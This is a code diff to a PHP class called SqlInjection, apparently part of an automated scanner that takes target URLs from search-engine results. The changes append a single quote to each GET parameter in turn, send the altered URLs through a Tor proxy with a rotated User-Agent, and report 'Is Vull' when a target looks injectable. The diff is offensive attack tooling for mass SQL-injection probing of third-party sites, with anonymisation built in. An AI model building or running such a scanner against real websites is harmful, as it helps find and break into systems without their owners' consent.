@@ -45,9 +45,9 @@ class SqlInjection
             foreach ($this->targets as $keySearchEngenier => $searchEngenier) {
                 foreach ($searchEngenier as $keyTarget => $target) {
                     $this->target = urldecode(urldecode($target));
-                    $resultCheck = $this->checkSuccess();
-                    if($resultCheck){
-                        $result[]=$resultCheck;
+                    $resultValid = $this->checkSuccess();
+                    if ($resultValid) {
+                        $result[]=$resultValid;
                     }
                 }
             }
@@ -89,27 +89,35 @@ class SqlInjection
 
     protected function setVull()
     {
-        $url = $this->generateUrlByExploit();
-        echo "\n url =>".$url."\n";
+        $urls = $this->generateUrlByExploit();
+        foreach($urls as $url){
+            echo "\n url =>".$url."\n";
+            $resultcheckAttack = $this->setAttack($url);
+            if (!empty($resultcheckAttack)) {
+                echo 'Is Vull';
 
-        return $this->setAttack($url);
+                return $url;
+            }
+        }
+
+        return false;
     }
 
     protected function generateUrlByExploit()
     {
+        $exploit="'";
         $explodeUrl = parse_url($this->target);
         $explodeQuery = explode('&', $explodeUrl['query']);
-        $queryFinal = '';
         //Identify and sets urls of values of Get
         foreach ($explodeQuery as $keyQuery => $query) {
-            $queryFinal .= $query."'&";
-            //$explodeQueryEqual=explode("=",$query);
-            //$wordsValue[$keyQuery]=$explodeQueryEqual[1];
-            //$wordsKey[$keyQuery]=$explodeQueryEqual[0];
+            $explodeQueryEqual = explode('=', $query);
+            $wordsValue[$explodeQueryEqual[0]] = $explodeQueryEqual[1];
         }
-        $queryFinal = substr($queryFinal,0,-1);
+        foreach($wordsValue as $keyValue => $value){
+            $urls[]=str_replace($keyValue."=".$value,$keyValue."=".$value.$exploit,$this->target);
+        }
 
-        return $explodeUrl['scheme'].'://'.$explodeUrl['host'].$explodeUrl['path'].'?'.$queryFinal;
+        return $urls;
     }
 
     protected function setAttack($url)
@@ -119,7 +127,7 @@ class SqlInjection
             'headers' => ['User-Agent' => $header->getUserAgent()],
             'proxy' => $this->commandData['tor'],
             'timeout' => 30,
-            ],
+        ],
         ]);
         try {
             $body = $client->get($url)->getBody()->getContents();
